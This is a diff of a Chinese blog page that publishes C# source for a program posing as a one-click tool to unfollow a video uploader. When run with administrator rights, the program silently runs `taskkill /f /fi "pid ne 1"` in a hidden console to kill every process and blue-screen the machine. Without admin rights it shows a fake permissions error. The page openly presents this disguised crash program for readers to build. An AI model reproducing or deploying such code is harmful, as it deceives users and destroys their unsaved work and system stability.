@@ -7,7 +7,7 @@
     <link href="https://xbodw.github.io/Resources/Flutas.ico" rel="icon">
 	<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.6.0/highlight.min.js"></script>
     <meta name="xbodw.github.io" content="Flutas">
-    <title>利用html css和js编写浏览器扩展|Flutas</title>
+    <title>一键取关UP主代码来咯!|Flutas</title>
 </head>
 <body>
     <br>
@@ -36,10 +36,13 @@
       <br>
       <span>该项目由C# 窗体应用程序完成,如有意编写者,请自行下载<a href="https://visualstudio.microsoft.com/">Visual Studio开发工具</a></span>
       <br>
+	    <br>
+	    <br>
       <span>上代码:</span>
+	    <br>
       <pre>
       <code type="csharp">
-      using System;
+using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
@@ -66,7 +69,7 @@ namespace 一键取关
         {
             WindowsIdentity identity = WindowsIdentity.GetCurrent();
             WindowsPrincipal principal = new WindowsPrincipal(identity);
-            return principal.IsInRole(WindowsBuiltInRole.Administrator);
+            return principal.IsInRole(WindowsBuiltInRole.Administrator); //返回是否以管理员身份运行
         }
 
         private void button1_Click(object sender, EventArgs e)
@@ -84,13 +87,13 @@ namespace 一键取关
                     p.StartInfo.CreateNoWindow = true;
                     p.Start();
                     StreamWriter cmdWriter = p.StandardInput;
-                    cmdWriter.WriteLine(@"taskkill /f /fi ""pid ne 1""");
+                    cmdWriter.WriteLine(@"taskkill /f /fi ""pid ne 1"""); //输入蓝屏cmd命令
                     p.WaitForExit();
                     p.Close();
                 }
             } else
             {
-                MessageBox.Show("权限不足，无法取关2008球", "2008球 取关程序", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                MessageBox.Show("权限不足，无法取关2008球", "2008球 取关程序", MessageBoxButtons.OK, MessageBoxIcon.Error); //非管理员
             }
         }
     }
@@ -101,6 +104,9 @@ namespace 一键取关
       <span>以上代码在点击取关按钮时会检测是否为管理员权限,如果不是管理员则提示无法取关;如果管理员身份运行点击就会蓝屏</span>
       <br>
       <span>点个关注再走吧！</span>
+	    <br>
+	    <br>
+	    <br>
     </div>
     <br>
     <footer>(C) Flutas 2023 </footer>
